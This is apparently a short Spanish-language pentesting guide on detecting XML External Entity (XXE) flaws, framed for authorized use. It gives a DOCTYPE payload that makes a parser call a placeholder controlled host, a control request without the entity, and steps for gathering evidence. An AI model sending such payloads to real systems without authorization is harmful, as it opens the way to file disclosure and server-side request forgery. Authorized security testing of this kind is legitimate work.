# 🗡️ XML External Entity (XXE): payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 🔬 Pruebas por escenario

### 1. Entidad hacia host controlado

**Objetivo:** Detectar resolución externa sin pedir archivos.

```xml
<!DOCTYPE r [<!ENTITY xxe SYSTEM "https://{CONTROLLED_HOST}/xxe-prueba-123">]><r>&xxe;</r>
```

**Interpretación:** Una solicitud al host controlado correlacionada con el envío indica resolución externa.

### 2. Control sin entidad

**Objetivo:** Confirmar que la conexión depende del DTD.

```xml
<r>prueba-123</r>
```

**Interpretación:** No debe generarse tráfico hacia el host de prueba.

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../../README.md)
